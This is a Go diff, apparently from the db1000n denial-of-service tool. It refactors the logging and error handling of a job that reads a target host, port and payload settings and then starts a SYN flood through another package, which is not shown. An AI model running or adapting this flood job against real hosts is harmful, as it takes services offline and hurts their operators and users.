@@ -3,14 +3,15 @@ package jobs
 import (
 	"context"
 	"encoding/json"
+	"log"
 
-	"github.com/Arriven/db1000n/src/logs"
 	"github.com/Arriven/db1000n/src/synfloodraw"
 	"github.com/Arriven/db1000n/src/utils"
 )
 
-func synFloodJob(ctx context.Context, l *logs.Logger, args Args) error {
+func synFloodJob(ctx context.Context, args Args, debug bool) error {
 	defer utils.PanicHandler()
+
 	type synFloodJobConfig struct {
 		BasicJobConfig
 		Host          string
@@ -18,9 +19,9 @@ func synFloodJob(ctx context.Context, l *logs.Logger, args Args) error {
 		PayloadLength int    `json:"payload_len"`
 		FloodType     string `json:"flood_type"`
 	}
+
 	var jobConfig synFloodJobConfig
-	err := json.Unmarshal(args, &jobConfig)
-	if err != nil {
+	if err := json.Unmarshal(args, &jobConfig); err != nil {
 		return err
 	}
 
@@ -29,6 +30,11 @@ func synFloodJob(ctx context.Context, l *logs.Logger, args Args) error {
 		<-ctx.Done()
 		shouldStop <- true
 	}()
-	l.Debug("sending syn flood with params: Host %v, Port %v , PayloadLength %v, FloodType %v", jobConfig.Host, jobConfig.Port, jobConfig.PayloadLength, jobConfig.FloodType)
+
+	if debug {
+		log.Printf("sending syn flood with params: Host %v, Port %v , PayloadLength %v, FloodType %v",
+			jobConfig.Host, jobConfig.Port, jobConfig.PayloadLength, jobConfig.FloodType)
+	}
+
 	return synfloodraw.StartFlooding(shouldStop, jobConfig.Host, jobConfig.Port, jobConfig.PayloadLength, jobConfig.FloodType)
 }
